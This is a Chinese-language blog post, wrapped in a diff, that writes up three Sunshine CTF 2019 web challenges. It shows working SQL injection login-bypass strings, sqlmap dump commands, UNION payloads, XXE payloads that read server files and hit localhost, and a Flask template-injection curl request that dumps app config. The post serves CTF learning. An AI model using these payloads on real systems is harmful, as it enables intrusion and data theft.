@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x00 前言比赛地址: https://2019.sunshinectf.org/challenges
+时间: 星期日, 30 三月 2019, 1:00 AM (1:00) — 星期一, 01 四月 2019, 1:00 PM (13:00) 
+0x01 WrestlerBook1.题目描述WrestlerBook is the social network for wrestlers, by">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sunshine CTF 2019 Web">
+<meta property="og:url" content="http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="0x00 前言比赛地址: https://2019.sunshinectf.org/challenges
+时间: 星期日, 30 三月 2019, 1:00 AM (1:00) — 星期一, 01 四月 2019, 1:00 PM (13:00) 
+0x01 WrestlerBook1.题目描述WrestlerBook is the social network for wrestlers, by">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bd3740165.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bd547fe01.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bd6a7ae08.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bd7e30458.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bd993f247.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bdbf309c4.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bdd1e09fc.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2bde9f0ac0.png">
+<meta property="og:image" content="https://i.loli.net/2019/04/02/5ca2be01903ae.png">
+<meta property="og:updated_time" content="2019-04-02T01:44:17.082Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sunshine CTF 2019 Web">
+<meta name="twitter:description" content="0x00 前言比赛地址: https://2019.sunshinectf.org/challenges
+时间: 星期日, 30 三月 2019, 1:00 AM (1:00) — 星期一, 01 四月 2019, 1:00 PM (13:00) 
+0x01 WrestlerBook1.题目描述WrestlerBook is the social network for wrestlers, by">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/02/5ca2bd3740165.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Sunshine CTF 2019 Web</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/04/01/b00t2root-19-web/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&text=Sunshine CTF 2019 Web"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&is_video=false&description=Sunshine CTF 2019 Web"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sunshine CTF 2019 Web&body=Check out this article: http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&title=Sunshine CTF 2019 Web"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/04/02/Sunshine-CTF-2019-Web/&name=Sunshine CTF 2019 Web&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-WrestlerBook"><span class="toc-number">2.</span> <span class="toc-text">0x01 WrestlerBook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目描述"><span class="toc-number">2.1.</span> <span class="toc-text">1.题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解题思路"><span class="toc-number">2.2.</span> <span class="toc-text">2.解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Wrestler-Name-Generator"><span class="toc-number">3.</span> <span class="toc-text">0x02 Wrestler Name Generator</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目描述-1"><span class="toc-number">3.1.</span> <span class="toc-text">1.题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解题思路-1"><span class="toc-number">3.2.</span> <span class="toc-text">2.解题思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Portfolio"><span class="toc-number">4.</span> <span class="toc-text">0x03 Portfolio</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-题目描述-2"><span class="toc-number">4.1.</span> <span class="toc-text">1.题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-解题思路-2"><span class="toc-number">4.2.</span> <span class="toc-text">2.解题思路</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Sunshine CTF 2019 Web
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-04-02T01:37:30.000Z" itemprop="datePublished">2019-04-02</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>比赛地址: <a href="https://2019.sunshinectf.org/challenges" target="_blank" rel="external">https://2019.sunshinectf.org/challenges</a></p>
+<p>时间: 星期日, 30 三月 2019, 1:00 AM (1:00) — 星期一, 01 四月 2019, 1:00 PM (13:00) </p>
+<h2 id="0x01-WrestlerBook"><a href="#0x01-WrestlerBook" class="headerlink" title="0x01 WrestlerBook"></a>0x01 WrestlerBook</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn’t get an invite don’t even bother trying to view our profiles.</p>
+<p><a href="http://bk.sunshinectf.org" target="_blank" rel="external">http://bk.sunshinectf.org</a></p>
+<p>Author: dmaria</p>
+<h3 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>看到登录界面先尝试使用万能密码进行fuzz一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">admin&apos; --</div><div class="line">admin&apos; #</div><div class="line">admin&apos;/*</div><div class="line">&apos; or 1=1--</div><div class="line">&apos; or 1=1#</div><div class="line">&apos; or 1=1/*</div><div class="line">&apos;) or &apos;1&apos;=&apos;1--</div><div class="line">&apos;) or (&apos;1&apos;=&apos;1--</div><div class="line">&apos; or 1;#</div></pre></td></tr></table></figure>
+<p>最终发现<code>&#39; or 1=1--</code>等几个可以成功登录，并且在登录之后我发现存在flag关键词并且对应的值为N/A <img src="https://i.loli.net/2019/04/02/5ca2bd3740165.png" alt="974FFF3C-D28B-48DB-A3F3-6B7986022982.png"></p>
+<p>并且在fuzz过程中发现会出现如下错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line">Date: Mon, 01 Apr 2019 14:24:46 GMT</div><div class="line">Server: Apache/2.4.25 (Debian)</div><div class="line">Vary: Accept-Encoding</div><div class="line">X-Powered-By: PHP/7.0.33</div><div class="line">Content-Length: 380</div><div class="line">Connection: Close</div><div class="line"></div><div class="line">&lt;br /&gt;</div><div class="line">&lt;b&gt;Warning&lt;/b&gt;:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &amp;quot;#&amp;quot; in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;19&lt;/b&gt;&lt;br /&gt;</div><div class="line">&lt;br /&gt;</div><div class="line">&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:20</div><div class="line">Stack trace:</div><div class="line">#0 &#123;main&#125;</div><div class="line">  thrown in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;20&lt;/b&gt;&lt;br /&gt;</div></pre></td></tr></table></figure>
+<p>其实后面的工作可以直接使用sqlmap来进行了</p>
+<p><img src="https://i.loli.net/2019/04/02/5ca2bd547fe01.png" alt="6930ECB0-5A74-4EA4-89FC-32445C4443D4.png"></p>
+<p>要注意一下sqlite中包含各种信息的表是sqlite_master。</p>
+<p>所以使用sqlmap默认去跑的话是注不出数据的 首先猜解下<code>sqlite_master</code>表中的信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; --columns</div></pre></td></tr></table></figure>
+<p>可以看到关键信息有name，但是关键的sql就没有显示 之后查name中有什么信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;name&quot; --dump</div></pre></td></tr></table></figure>
+<p>但是直接注name中的user表，是跑不出信息的。所以我们查一下sql表中的信息，看user表是怎样构成的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;sql&quot; --dump</div></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/04/02/5ca2bd6a7ae08.png" alt="708F625A-1562-4597-B481-AA68C38283F2.png"></p>
+<p> 表结构出来了之后直接查flag就好了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt --sql-query=&quot;SELECT group_concat(flag) FROM users&quot;</div></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/04/02/5ca2bd7e30458.png" alt="屏幕快照 2019-04-02 上午9.17.45.png"></p>
+<p>手动注入参考： <a href="https://ctftime.org/writeup/14208" target="_blank" rel="external">https://ctftime.org/writeup/14208</a></p>
+<p>关键payload记录</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Username: admin</div><div class="line">Password: ' union SELECT 1, 2, group_concat(name), 4, group_concat(sql), 6, 7, 8 FROM sqlite_master WHERE type = "table";#</div></pre></td></tr></table></figure>
+<p>获取表的结构</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span> (</div><div class="line">    <span class="string">`username`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`password`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`avatar`</span>    <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`age`</span>   <span class="built_in">INTEGER</span>,</div><div class="line">    <span class="string">`name`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`title`</span> <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`flag`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`id`</span>    <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT</div><div class="line">),<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_sequence(<span class="keyword">name</span>,seq)</div></pre></td></tr></table></figure>
+<p>dump flag</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Username: admin</div><div class="line">Password: ' union SELECT group_concat(username), group_concat(password), group_concat(avatar), group_concat(age), group_concat(name), group_concat(title), group_concat(flag), group_concat(id) FROM users;#</div></pre></td></tr></table></figure>
+<p>返回值</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"desc"</span>&gt;</span>Flag: N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,example_flag,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,sun&#123;ju57_4n07h3r_5ql1_ch4ll&#125;,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="0x02-Wrestler-Name-Generator"><a href="#0x02-Wrestler-Name-Generator" class="headerlink" title="0x02 Wrestler Name Generator"></a>0x02 Wrestler Name Generator</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.</p>
+<p><a href="http://ng.sunshinectf.org" target="_blank" rel="external">http://ng.sunshinectf.org</a></p>
+<p>Author: dmaria</p>
+<h3 id="2-解题思路-1"><a href="#2-解题思路-1" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>关键点：可以看到我输入的名称之后还是完成的进行了显示，服务端脚本是PHP，并且请求的Accept字段中有xml，所以猜测可能是XXE</p>
+<p>注意在使用paylaod是要先base64后url编码 进一步使用如下不合法的XML数据进行测试</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">version</span>=<span class="string">"abc"</span> ?&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">Doc</span>/&gt;</span></div></pre></td></tr></table></figure>
+<p>观察到报错</p>
+<p><img src="https://i.loli.net/2019/04/02/5ca2bd993f247.png" alt="33F95B3F-40F7-44B5-94E3-F2F866E8FCC5.png"></p>
+<p> 确认是xxe漏洞，之后使用如下payload尝试去读取<code>generate.php</code>的源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &apos;php://filter/convert.base64-encode/resource=generate.php&apos;&gt;]&gt;&lt;input&gt;&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;&lt;/input&gt;</div></pre></td></tr></table></figure>
+<p>服务端的源代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$whitelist = array(</div><div class="line">    &apos;127.0.0.1&apos;,</div><div class="line">    &apos;::1&apos;</div><div class="line">);</div><div class="line">// if this page is accessed from the web server, the flag is returned</div><div class="line">// flag is in env variable to avoid people using XXE to read the flag</div><div class="line">// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)</div><div class="line">if(in_array($_SERVER[&apos;REMOTE_ADDR&apos;], $whitelist))&#123;</div><div class="line">	echo $_ENV[&quot;FLAG&quot;];</div><div class="line">	return;</div><div class="line">&#125;</div><div class="line">// make sure the input parameter exists</div><div class="line">if (empty($_GET[&quot;input&quot;])) &#123;</div><div class="line">	echo &quot;Please include the &apos;input&apos; get parameter with your request, Brother&quot;;</div><div class="line">	return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// get input</div><div class="line">$xmlData = base64_decode($_GET[&quot;input&quot;]);</div><div class="line">// parse xml</div><div class="line">$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die(&quot;Error parsing XML: &quot;.&quot;\n&quot;.$xmlData);</div><div class="line">$firstName = $xml-&gt;firstName;</div><div class="line">$lastName = $xml-&gt;lastName;</div><div class="line">// generate name</div><div class="line">$nouns = array(&quot;Killer&quot;, &quot;Savage&quot;, &quot;Stallion&quot;, &quot;Coder&quot;, &quot;Hacker&quot;, &quot;Slasher&quot;, &quot;Crusher&quot;, &quot;Barbarian&quot;, &quot;Ferocious&quot;, &quot;Fierce&quot;, &quot;Vicious&quot;, &quot;Hunter&quot;, &quot;Brute&quot;, &quot;Tactician&quot;, &quot;Expert&quot;);</div><div class="line">$noun = $nouns[array_rand($nouns)];</div><div class="line">$generatedName = $firstName.&apos; &quot;The &apos;.$noun.&apos;&quot; &apos;.$lastName;</div><div class="line"></div><div class="line">// return html for the results page</div><div class="line">echo &lt;&lt;&lt;EOT</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;Wrestler Name Generator&lt;/title&gt;</div><div class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</div><div class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot;&gt;</div><div class="line">  &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">  &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">  &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;div class=&quot;jumbotron text-center&quot;&gt;</div><div class="line">  &lt;h1&gt;Your Wrestler Name Is:&lt;/h1&gt;</div><div class="line">  &lt;h2&gt;$generatedName&lt;/h2&gt; </div><div class="line">&lt;!--hacker name functionality coming soon!--&gt;</div><div class="line">&lt;!--if you&apos;re trying to test the hacker name functionality, make sure you&apos;re accessing this page from the web server--&gt;</div><div class="line">&lt;!--&lt;h2&gt;Your Hacker Name Is: REDACTED&lt;/h2&gt;--&gt;</div><div class="line">  &lt;a href=&quot;/&quot;&gt;Go Back&lt;/a&gt; </div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">EOT;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>从源码上来看只要从本地访问<code>generate.php</code>文件就可以获取flag，所以使用如下payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span> encoding=<span class="string">'UTF-8'</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM 'http://localhost/generate.php'&gt;]&gt;</span><span class="tag">&lt;<span class="name">input</span>&gt;</span><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>返回的结果 <code>sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}</code></p>
+<h2 id="0x03-Portfolio"><a href="#0x03-Portfolio" class="headerlink" title="0x03 Portfolio"></a>0x03 Portfolio</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>Check out my development portfolio! I’m just getting started, so don’t be too mean :(</p>
+<p><a href="http://folio.sunshinectf.org" target="_blank" rel="external">http://folio.sunshinectf.org</a></p>
+<p>Author: dmaria</p>
+<h3 id="2-解题思路-2"><a href="#2-解题思路-2" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>首先web框架是flask；其次可以看到URL后面的参数是name，而页面对应的也是name；如果修改为zeroyu，则页面对应也显示zeroyu</p>
+<p><img src="https://i.loli.net/2019/04/02/5ca2bdbf309c4.png" alt="7DBD4583-BD88-4783-86A8-613E8BF18018.png"></p>
+<p> 但是如果我输入<code>9</code>的话并不会产生对应的计算</p>
+<p><img src="https://i.loli.net/2019/04/02/5ca2bdd1e09fc.png" alt="7001968E-4A77-4187-9DFB-A4985F9085C2.png"></p>
+<p> 之后访问另外一个界面，查看源代码发现一行提交信息被注释掉了，编辑html将注释去除并进行提交。 <img src="https://i.loli.net/2019/04/02/5ca2bde9f0ac0.png" alt="8156B4B1-2EE4-4BA2-BDF1-D0179ED07027.png"></p>
+<p>但是并没有什么效果，所以不妨直接访问一下对应的路径，而不使用这个模板参数。 <code>http://folio.sunshinectf.org/templates/admin.html</code> 得到一些返回信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% if config.DEBUG %&#125; &#123;&#123;config.FLAG&#125;&#125; &#123;% endif %&#125; Hi there!</div></pre></td></tr></table></figure>
+<p>所以可以看到flag是在config中的，所以我们构造如下payload并利用<code>http://folio.sunshinectf.org/render</code>这个点，最终成功get flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -i http://folio.sunshinectf.org/render --data &quot;template=hello/&#123;&#123;config.items()&#125;&#125;&quot; -L</div></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/04/02/5ca2be01903ae.png" alt="C67FB07F-C140-451D-B24D-EFF0AE88E180.png"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
